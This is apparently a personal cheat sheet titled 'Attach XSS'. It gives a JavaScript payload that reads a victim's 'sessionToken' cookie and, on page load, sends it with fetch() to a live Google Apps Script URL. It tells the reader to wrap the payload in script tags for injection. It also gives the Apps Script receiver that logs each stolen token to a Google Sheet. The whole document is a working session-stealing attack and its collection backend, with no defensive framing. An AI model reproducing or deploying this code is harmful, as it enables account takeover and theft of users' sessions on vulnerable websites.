🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥

# Attach XSS

🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥

**Bad Code**

```js
function getCookie(name) {
  const cookies = document.cookie.split(";");
  for (let cookie of cookies) {
    let [key, value] = cookie.trim().split("=");
    if (key === name) {
      return decodeURIComponent(value);
    }
  }
  return null;
}

function sendData() {
  const sessionToken = getCookie("sessionToken");

  fetch(
    "https://script.google.com/macros/s/AKfycbyeeuFZhtUyVIW-uoZr-cBvoFecZ5CF5vnHKWsXYkO_XGxsN1dcgjZiNq3NyWLL9pI-/exec?sessionToken=" +
      encodeURIComponent(sessionToken)
  )
    .then((res) => res.json())
    .then((data) => console.log("Server response:", data))
    .catch((err) => console.error(err));
}

window.onload = sendData;
```

- Wrap in

```js
<script></script>
```

- Marco

```js
function doGet(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

  // Lấy query string ?sessionToken=...
  var token = e.parameter.sessionToken || "none";

  // Ghi vào Google Sheet
  sheet.appendRow([token, new Date()]);

  // Trả về JSON response
  var result = {
    status: "success",
    token: token,
  };
  return ContentService.createTextOutput(JSON.stringify(result)).setMimeType(
    ContentService.MimeType.JSON
  );
}
```

💥💥💥💥💥💥💥💥💥💥💥💥💥
